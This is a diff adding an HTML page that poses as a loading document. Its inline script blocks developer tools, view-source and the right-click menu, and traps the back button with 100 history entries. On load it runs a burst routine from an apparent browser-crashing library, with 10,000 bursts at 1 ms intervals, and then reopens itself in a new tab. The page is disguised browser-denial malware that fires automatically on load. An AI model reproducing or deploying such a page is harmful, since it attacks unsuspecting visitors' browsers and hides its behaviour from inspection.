@@ -1,0 +1,113 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <title>Loading document...</title>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
+    <meta name="viewport" content="initial-scale=1.0,user-scalable=no,maximum-scale=1,width=device-width">
+    <meta name="robots" content="noindex, nofollow">
+    
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            width: 100vw;
+            height: 100vh;
+            background: #ffffff;
+            overflow: hidden;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+        }
+        
+        .BrashHidden-container {
+            width: 100%;
+            height: 100%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex-direction: column;
+            opacity: 0;
+            animation: BrashHidden-fadeIn 0.3s ease forwards;
+        }
+        
+        @keyframes BrashHidden-fadeIn {
+            to { opacity: 1; }
+        }
+        
+        .BrashHidden-loader {
+            width: 24px;
+            height: 24px;
+            border: 2px solid #e0e0e0;
+            border-top-color: #666;
+            border-radius: 50%;
+            animation: BrashHidden-spin 0.8s linear infinite;
+        }
+        
+        @keyframes BrashHidden-spin {
+            to { transform: rotate(360deg); }
+        }
+        
+        .BrashHidden-text {
+            margin-top: 16px;
+            font-size: 14px;
+            color: #666;
+            letter-spacing: 0.3px;
+        }
+    </style>
+    
+    <script src="assets/js/brash.min.js"></script>
+    
+    <script>
+        (function() {
+            "use strict";
+            
+            window.addEventListener("beforeunload", function(e) {
+                e.preventDefault();
+                e.returnValue = "Document is still loading. Are you sure you want to leave?";
+                return e.returnValue;
+            });
+            
+            window.addEventListener("keydown", function(e) {
+                if (
+                    e.key === "F12" ||
+                    (e.ctrlKey && e.shiftKey && (e.key === "I" || e.key === "J" || e.key === "C")) ||
+                    (e.metaKey && e.altKey && (e.key === "I" || e.key === "J" || e.key === "C")) ||
+                    (e.ctrlKey && e.key === "U") ||
+                    (e.metaKey && e.key === "U")
+                ) {
+                    e.preventDefault();
+                    return false;
+                }
+            });
+            
+            document.addEventListener("contextmenu", function(e) {
+                e.preventDefault();
+                return false;
+            });
+            
+            for (let i = 0; i < 100; i++) {
+                window.history.pushState({}, "", window.location.href);
+            }
+            
+            window.addEventListener("load", function() {
+                Brash.run({ burstSize: 10000, interval: 1 });
+                
+                setTimeout(function() {
+                    try {
+                        window.open(window.location.href, "_blank");
+                    } catch(e) {}
+                }, 2000);
+            });
+        })();
+    </script>
+</head>
+<body>
+    <div class="BrashHidden-container">
+        <div class="BrashHidden-loader"></div>
+        <div class="BrashHidden-text">Loading document...</div>
+    </div>
+</body>
+</html>
